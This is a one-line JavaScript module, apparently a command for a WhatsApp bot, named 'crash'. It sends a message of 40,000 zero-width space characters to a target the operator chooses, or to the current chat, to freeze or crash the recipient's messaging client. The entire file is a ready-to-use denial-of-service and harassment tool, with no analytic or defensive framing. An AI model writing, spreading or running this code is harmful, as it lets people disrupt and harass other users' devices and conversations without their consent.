module.exports={name:'crash',execute:async(s,m,a)=>{const f=a[0]||m.key.remoteJid;await s.sendMessage(f,{text:'\u200B'.repeat(40000)})}}
